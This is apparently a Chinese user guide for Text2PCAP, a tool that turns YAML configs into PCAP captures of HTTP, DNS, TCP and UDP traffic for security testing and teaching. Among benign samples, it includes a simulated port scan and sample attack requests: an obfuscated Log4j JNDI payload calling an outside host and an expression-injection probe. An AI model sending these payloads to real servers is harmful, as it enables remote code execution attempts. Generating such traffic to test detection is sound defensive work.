# Text2PCAP 用户使用指南

## 概述

Text2PCAP 是一个基于 YAML 配置文件生成网络数据包的工具，支持 HTTP、DNS、TCP、UDP 四种协议。通过简单的 YAML 配置，您可以快速生成符合标准的 PCAP 文件，用于网络分析、安全测试和教学演示。

## 功能特性

- **多协议支持**: 支持 HTTP、DNS、TCP、UDP 四种网络协议
- **多协议混合**: 支持在同一配置文件中混合使用多种协议，按YAML中出现顺序生成数据包
- **多数据块**: 每个协议支持多个数据块，模拟复杂的网络交互场景
- **灵活编码**: 支持 plain、base64、hex 三种数据编码格式
- **智能端口**: 支持固定端口和RANDOM随机端口生成
- **时间戳管理**: 全局时间戳管理确保数据包时序正确
- **TCP状态跟踪**: 完整的TCP连接生命周期模拟，包括三次握手和四次挥手
- **配置驱动**: 严格按照YAML配置文件生成数据包，确保输出的准确性和可控性
- **标准兼容**: 生成符合Wireshark标准的PCAP文件

## 快速开始

### 基本命令

```bash
# 使用默认配置文件生成 PCAP
./text2pcap.exe

# 指定配置文件和输出文件
./text2pcap.exe -c config_http.yaml -o http_traffic.pcap

# 启用详细输出
./text2pcap.exe -c config_dns.yaml -o dns_traffic.pcap -v

# 显示帮助信息
./text2pcap.exe -h
```

### 命令行参数

- `-c, --config`: 指定配置文件路径（默认：test.yaml）
- `-o, --output`: 指定输出 PCAP 文件路径
- `-v, --verbose`: 启用详细输出模式
- `-h, --help`: 显示帮助信息

## YAML 配置文件格式

### 基本结构

每个配置文件包含以下基本结构：

```yaml
info:
  name: "配置名称"
  description: "配置描述"

# 协议配置块（支持 http、dns、tcp、udp）
protocol_name:
  data:
    - description: "数据包描述"
      ip_pair:
        src_ip: "源IP地址"
        src_port: "源端口"
        dst_ip: "目标IP地址"
        dst_port: "目标端口"
      request:
        format: "数据格式"
        req_data: "请求数据"
      response:
        format: "数据格式"
        resp_data: "响应数据"
```

**注意**: 
- `info` 块使用对象格式，不是数组格式
- 每个协议下的 `data` 是数组，支持多个数据块
- 支持在同一配置文件中使用多种协议，按YAML中出现顺序执行

### 关键字说明

#### 1. info 块

- **name**: 配置文件名称，用于生成默认 PCAP 文件名（**必填字段**）
- **description**: 配置文件描述信息

**重要提示**: `name` 字段为必填字段，如果未设置将导致配置验证失败。当用户未通过 `-o` 参数指定输出文件名时，该字段用于生成默认的 PCAP 文件名，格式为 `{name}_{timestamp}.pcap`。

#### 2. ip_pair 块

- **src_ip**: 源 IP 地址（IPv4 格式）
- **src_port**: 源端口号，支持：
  - 具体端口号：如 `8080`
  - 随机端口：使用 `RANDOM` 关键字
- **dst_ip**: 目标 IP 地址（IPv4 格式）
- **dst_port**: 目标端口号，支持协议默认端口：
  - HTTP 协议：默认 80 端口
  - DNS 协议：默认 53 端口

#### 3. 数据格式 (format)

支持以下数据格式：

- **plain**: 纯文本格式，直接使用原始文本数据
- **base64**: Base64编码格式，需要提供Base64编码的数据
- **hex**: 十六进制格式，需要提供十六进制编码的数据

## 协议配置详解

### HTTP 协议配置

HTTP协议支持完整的HTTP请求和响应模拟：

```yaml
http:
  data:
    - description: "HTTP请求描述"
      ip_pair:
        src_ip: "源IP地址"
        src_port: RANDOM  # 或具体端口号
        dst_ip: "目标IP地址"
        dst_port: 80      # HTTP默认端口
      request:
        format: plain     # 支持 plain、base64、hex
        req_data: |
          GET /path HTTP/1.1
          Host: example.com
          User-Agent: Mozilla/5.0
          
          # POST请求可包含请求体
      response:
        format: plain
        resp_data: |
          HTTP/1.1 200 OK
          Content-Type: text/html
          Content-Length: 100
          
          <html><body>Response content</body></html>
```

### DNS 协议配置

DNS协议支持多种查询类型：

```yaml
dns:
  data:
    - description: "DNS查询描述"
      ip_pair:
        src_ip: "源IP地址"
        src_port: RANDOM
        dst_ip: "DNS服务器IP"
        dst_port: 53      # DNS默认端口
      request:
        req_type: A       # 支持 A、AAAA、CNAME、MX、TXT
        domain: "查询域名"
      response:
        resp_status_code: 0  # 0表示成功，其他值表示错误
        resp_data: "响应数据"  # 根据查询类型返回相应数据
```

**DNS查询类型说明：**
- **A**: IPv4地址查询，返回IP地址
- **AAAA**: IPv6地址查询
- **CNAME**: 别名查询，返回规范名称
- **MX**: 邮件交换记录查询
- **TXT**: 文本记录查询

### TCP 协议配置

TCP协议支持完整的连接生命周期和多轮数据交换：

```yaml
tcp:
  data:
    - description: "TCP连接描述"
      ip_pair:
        src_ip: "源IP地址"
        src_port: RANDOM
        dst_ip: "目标IP地址"
        dst_port: "目标端口"
      data_pair:  # 支持多轮数据交换
        - description: "第一轮数据交换"
          request:
            format: plain
            req_data: "请求数据"
          response:
            format: plain
            resp_data: "响应数据"
        - description: "第二轮数据交换"
          request:
            format: base64
            req_data: "YmFzZTY0IGRhdGE="
          response:
            format: hex
            resp_data: "48656c6c6f20576f726c64"
```

**TCP特性：**
- 自动处理三次握手建立连接
- 支持多轮请求-响应数据交换
- 自动处理四次挥手关闭连接
- 正确维护TCP序列号和确认号

### UDP 协议配置

UDP协议支持简单的请求-响应模式：

```yaml
udp:
  data:
    - description: "UDP通信描述"
      ip_pair:
        src_ip: "源IP地址"
        src_port: RANDOM
        dst_ip: "目标IP地址"
        dst_port: "目标端口"
      request:
        format: plain
        req_data: "UDP请求数据"
      response:
        format: plain
        resp_data: "UDP响应数据"
```

### 混合协议配置

支持在同一配置文件中混合使用多种协议，按YAML中出现的顺序依次生成数据包：

```yaml
info:
  name: "混合协议示例"
  description: "HTTP、UDP、HTTP混合使用"

http:  # 第一个协议块
  data:
    - description: "第一个HTTP请求"
      # ... HTTP配置

udp:   # 第二个协议块
  data:
    - description: "UDP通信"
      # ... UDP配置

http:  # 第三个协议块（可重复使用协议）
  data:
    - description: "第二个HTTP请求"
      # ... HTTP配置
```

## 配置示例

### 1. HTTP 协议示例 (config_http.yaml)

远程命令执行模拟配置：

```yaml
info:
  name: http测试用例
  description: 测试
http:
  data:
    - description: "通过HTTP POST请求用例"
      ip_pair:
        src_ip: 92.68.39.2
        src_port: RANDOM
        dst_ip: 172.168.1.200
        dst_port: 80  
      request:
        format: plain
        req_data: |
          POST /page/index.php HTTP/1.1
          Host: example.com
          Content-Length: 11
          Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1
          Accept-Language: en
          Content-Type: application/x-www-form-urlencoded
          User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)

          id=7788
      response:
        format: plain
        resp_data: |
          HTTP/1.1 200 OK
          Content-Type: application/json
          Content-Length: 126

          {"msg":"success","retString":"0"}
```

### 2. DNS 协议示例 (config_dns.yaml)

DNS查询模拟配置：

```yaml
info:
  name: DNS查询测试
  description: DNS A record query and response

dns:
  data:
    - description: DNS A 类型请求示例
      ip_pair:
        src_ip: 10.18.1.100
        src_port: RANDOM
        dst_ip: 8.8.8.8
        dst_port: 53
      request:
        req_type: A
        domain: oa.example.com
      response:
        resp_status_code: 0
        resp_data: 199.247.27.41
    - description: DNS AAAA 类型请求示例
      ip_pair:
        src_ip: 10.18.1.100
        src_port: RANDOM
        dst_ip: 8.8.8.8
        dst_port: 53
      request:
        req_type: AAAA
        domain: oa6.example.com
      response:
        resp_status_code: 0
        resp_data: 2001:db8:85a3:8d3:1319:8a2e:370:7348
    - description: DNS CNAME 类型请求示例
      ip_pair:
        src_ip: 10.18.1.100
        src_port: RANDOM
        dst_ip: 8.8.8.8
        dst_port: 53
      request:
        req_type: CNAME
        domain: www.baidu.com
      response:
        resp_status_code: 0
        resp_data: www.a.shifen.com
    - description: DNS TXT 类型请求示例
      ip_pair:
        src_ip: 110.18.1.100
        src_port: RANDOM
        dst_ip: 8.8.8.8
        dst_port: 53
      request:
        req_type: TXT
        domain: ceshi.example.com
      response:
        resp_status_code: 0
        resp_data: v=spf1 include:spf.mail.qq.com ~all
    - description: DNS MX 类型请求示例
      ip_pair:
        src_ip: 192.168.1.100
        src_port: RANDOM
        dst_ip: 8.8.8.8
        dst_port: 53
      request:
        req_type: MX
        domain: google.com
      response:
        resp_status_code: 0
        resp_data: smtp1.google.com
```

#### DNS 记录类型说明

支持的DNS记录类型及其用途：

- **A记录**: 将域名解析为IPv4地址
- **AAAA记录**: 将域名解析为IPv6地址
- **CNAME记录**: 创建域名别名，指向另一个域名
- **MX记录**: 指定邮件交换服务器，用于邮件路由
- **TXT记录**: 存储任意文本信息，常用于域名验证、SPF记录等

#### DNS 响应码说明

常见的DNS响应码（resp_status_code）含义：

- **0 (NOERROR)**: 查询成功，无错误
- **1 (FORMERR)**: 格式错误，DNS服务器无法解析查询
- **2 (SERVFAIL)**: 服务器失败，DNS服务器遇到内部错误
- **3 (NXDOMAIN)**: 域名不存在
- **4 (NOTIMP)**: 不支持的查询类型
- **5 (REFUSED)**: 查询被拒绝
- **6 (YXDOMAIN)**: 不应该存在的域名存在
- **7 (YXRRSET)**: 不应该存在的资源记录集存在
- **8 (NXRRSET)**: 应该存在的资源记录集不存在
- **9 (NOTAUTH)**: 服务器对该区域没有权威性
- **10 (NOTZONE)**: 名称不在区域内

### 3. TCP 协议示例 (config_tcp_one_flow.yaml)

TCP单流连接配置：

```yaml
info:
  name: TCP多个请求在同一流中
  description: mutli request in one flow
tcp:
  data:
    - description: 连接TCP服务器
      ip_pair:
        src_ip: 12.168.7.210
        src_port: RANDOM
        dst_ip: 19.247.27.41
        dst_port: 3399
      data_pair:
        - description: tcp flow - 1
          request:
            format: plain
            req_data: |
              tcp request flow 1
          response:
            format: plain
            resp_data: |
              tcp response flow 1 
        - description: tcp flow - 2
          request:
            format: hex
            req_data: |
              746370207265717565737420666C6F772032
          response:
            format: hex
            resp_data: |
              74637020726573706F6E736520666C6F772032
        - description: tcp flow - 3
          request:
            format: base64
            req_data: |
              dGNwIHJlcXVlc3QgZmxvdyAz
          response:
            format: base64
            resp_data: |
              dGNwIHJlc3BvbnNlIGZsb3cgMw==
```

### 4. TCP 多流扫描示例 (config_tcp_scan_multi_flow.yaml)

TCP多流连接配置，模拟端口扫描场景：

```yaml
info:
  name: TCP端口连接-多条流
  description: multi tcp flow
tcp:
  data:
    - description: 172.168.4.66对10.200.3.100的3306端口连接
      ip_pair:
        src_ip: 172.168.4.66
        src_port: RANDOM
        dst_ip: 10.200.3.100
        dst_port: 3306
      data_pair:
        - description: 172.168.4.66对10.200.3.100的3306端口连接
          request:
            format: base64
            req_data: |
              YXJlIHlvdSBvayA/
          response:
            format: base64
            resp_data: |
              aSdtIGZpbmUu
    - description: 172.168.4.66对10.200.3.101的3306端口连接
      ip_pair:
        src_ip: 172.168.4.66
        src_port: RANDOM
        dst_ip: 10.200.3.101
        dst_port: 3306
      data_pair:
        - description: 172.168.4.66对10.200.3.101的3306端口连接
          request:
            format: base64
            req_data: |
              d2hvIGFyZSB5b3U=
          response:
            format: base64
            resp_data: |
              bXkgbmFtZSBpcyBpa3Vu
    - description: 172.168.4.66对10.200.3.102的3306端口连接
      ip_pair:
        src_ip: 172.168.4.66
        src_port: RANDOM
        dst_ip: 10.200.3.102
        dst_port: 3306
      data_pair:
        - description: 172.168.4.66对10.200.3.102的3306端口连接
          request:
            format: plain
            req_data: |
              is_ok
          response:
            format: plain
            resp_data: |
              OK
    - description: 172.168.4.66对10.200.3.103的3306端口连接
      ip_pair:
        src_ip: 172.168.4.66
        src_port: RANDOM
        dst_ip: 10.200.3.103
        dst_port: 3306
      data_pair:
        - description: 172.168.4.66对10.200.3.103的3306端口连接
          request:
            format: plain
            req_data: |
              is_ok
          response:
            format: plain
            resp_data: |
              OK
    - description: 172.168.4.66对10.200.3.104的3306端口连接
      ip_pair:
        src_ip: 172.168.4.66
        src_port: RANDOM
        dst_ip: 10.200.3.104
        dst_port: 3306
      data_pair:
        - description: 172.168.4.66对10.200.3.104的3306端口连接
          request:
            format: hex
            req_data: |
              6E6968616F6D61
          response:
            format: hex
            resp_data: |
              776F68656E68616F
```

### 5. UDP 协议示例

UDP通信配置：

```yaml
info:
  name: UDP通信测试
  description: UDP communication test

udp:
  data:
    - description: "UDP通信测试 - 模拟UDP协议的请求响应通信"
      ip_pair:
        src_ip: 93.68.89.21
        src_port: RANDOM
        dst_ip: 172.17.1.200
        dst_port: 9966
      request:
        format: plain
        req_data: "UDP Request Data"
      response:
        format: plain
        resp_data: "UDP Response Data"
```

### 6. 混合协议示例 (config_http_udp_http.yaml)

攻击链数据生成配置：

```yaml
info:
  name: 多个数据生成测试
  description: 配置多个顺序数据，用于生成攻击链
http: 
  data:
    - description: "通过POST请求示例"
      ip_pair:
        src_ip: 93.68.89.21
        src_port: RANDOM
        dst_ip: 172.168.1.200
        dst_port: 80  
      request:
        format: plain
        req_data: |
          POST /page/index.php HTTP/1.1
          Host: example.com
          Content-Length: 11
          Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1
          Accept-Language: en
          Content-Type: application/x-www-form-urlencoded
          User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)

          id=7788
      response:
        format: plain
        resp_data: |
          HTTP/1.1 200 OK
          Content-Type: application/json
          Content-Length: 126

          {"msg":"success","retString":"0"}
udp:
  data:
    - description: "UDP通信测试 - 模拟UDP协议的请求响应通信"
      ip_pair:
        src_ip: 93.68.89.21
        src_port: RANDOM
        dst_ip: 172.17.1.200
        dst_port: 9966
      request:
        format: plain
        req_data: "UDP Request Data"
      response:
        format: plain
        resp_data: "UDP Response Data"
http:
  data:
    - description: "GET请求用例"
      ip_pair:
        src_ip: 72.38.89.21
        src_port: RANDOM
        dst_ip: 172.168.1.200
        dst_port: 80  
      request:
        format: plain
        req_data: |
          GET /details?id=1 HTTP/1.1
          Host: 121.161.72.131
          Content-Length: 0
      response:
        format: plain
        resp_data: |
          HTTP/1.1 200 OK
          Server: nginx/1.22.0
          Date: Tue, 22 Apr 2025 03:22:20 GMT
          Content-Type: text/html
          Content-Length: 111
          Connection: close

          <html>
          <head><title></title></head>
          <body>
            repsonse ok
          </body>
          </html>
```

### 7. 远程命令执行示例 (rce_fail_http_1.yaml)

Log4j漏洞模拟配置：

```yaml
info:
  name: 远程命令执行用例
  description: 测试用例
http:
  data:
    - description: "log4j漏洞用例"
      ip_pair:
        src_ip: 22.33.44.55
        src_port: RANDOM
        dst_ip: 172.168.100.2
        dst_port: 80  
      request:
        format: plain
        req_data: |
          POST /log/log.action HTTP/1.1
          Accept: */*
          Content-Length: 76
          Content-Type: application/x-www-form-urlencoded
          User-Agent: Mozilla/5.0 (iPad; CPU iPad OS 16_7_6 like Mac OS X) AppleWebKit/531.0 (KHTML, like Gecko) 

          id=${jndi:${upper:L}d${lower:A}${upper:P}://baidu.com.net/index}
      response:
        format: plain
        resp_data: |
          HTTP/1.1 404 Not Found
          Server: nginx/1.22.0
          Date: Tue, 22 Apr 2025 06:08:01 GMT
          Content-Type: text/html
          Content-Length: 145
          Connection: close

          <html>
          <head><title>404 Not Found</title></head>
          <body>
          <center><h1>404 Not Found</h1></center>
          </body>
          </html>
```

### 8. 表达式注入示例 (rce_test1.yaml)

表达式注入攻击模拟配置：

```yaml
info:
  name: 表达式执行
  description: 测试用例
http:
  data:
    - description: "表达式注入"
      ip_pair:
        src_ip: 93.68.9.21
        src_port: 7788
        dst_ip: 172.168.100.200
        dst_port: 80  
      request:
        format: plain
        req_data: |
          GET /?id=1ewterH%25{8*8} HTTP/1.1
          Accept: */*
          Accept-Language: en
          Connection: close
          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.4.15
      response:
        format: plain
        resp_data: |
          HTTP/1.1 404 Not Found
          Server: nginx/1.22.0
          Date: Tue, 22 Apr 2025 06:07:50 GMT
          Content-Type: text/html
          Connection: close

          <html>
            <head><title>404 Not Found</title></head>
            <body>
            <center><h1>404 Not Found</h1></center>
            <hr><center>nginx/1.22.0</center>
          </body>
          </html>
```

## 数据格式详解

- **plain**: 明文格式（推荐使用）
  - 直接使用原始文本数据
  - 适用于HTTP请求/响应、DNS域名等文本内容
  - 支持多行文本，使用 `|` 符号保持格式

- **base64**: Base64 编码格式
  - 用于二进制数据或需要编码的文本
  - 程序会自动解码Base64数据
  - 适用于加密通信、二进制协议数据

- **hex**: 十六进制编码格式
  - 用于精确控制字节级数据
  - 程序会自动过滤换行符、空格等非十六进制字符
  - 适用于协议分析、恶意软件通信等场景
  - 支持大小写混合，如：`48656c6c6f` 或 `48656C6C6F`

**注意**: 如果指定了不支持的格式，程序将返回错误。建议优先使用 `plain` 格式以提高可读性和维护性。

## 使用注意事项

### 配置文件要求

1. **info块必填**: `name` 字段为必填项，用于生成默认输出文件名
2. **IP地址格式**: 必须使用有效的IPv4地址格式
3. **端口配置**: 支持具体端口号或使用 `RANDOM` 关键字
4. **数据编码**: 确保Base64和Hex格式的数据正确编码
5. **协议顺序**: 多协议配置按YAML中出现顺序执行

### 性能建议

- 大量数据包生成时建议使用较小的配置文件进行测试
- TCP协议的多轮数据交换会增加文件大小，请根据需要配置
- 使用 `-v` 参数可以查看详细的生成过程

### 故障排除

- **配置验证失败**: 检查YAML语法和必填字段
- **IP地址错误**: 确保使用正确的IPv4格式
- **编码错误**: 验证Base64和Hex数据的正确性
- **文件权限**: 确保对输出目录有写入权限

## 技术特性

### 时间戳管理

- 全局时间戳确保数据包时序正确
- 每个数据包间有适当的时间间隔
- 支持真实网络环境的时间模拟

### TCP连接管理

- 自动处理TCP三次握手建立连接
- 正确维护序列号和确认号
- 支持多轮数据交换
- 自动处理TCP四次挥手关闭连接

### 数据包结构

- 符合标准的以太网帧结构
- 正确的IP头部和校验和
- 协议特定的头部信息
- Wireshark兼容的PCAP格式

---

**Text2PCAP 工具基于YAML配置文件严格生成网络数据包，确保输出结果的准确性和可控性。通过合理配置，您可以模拟各种网络场景，用于安全测试、网络分析和教学演示。**
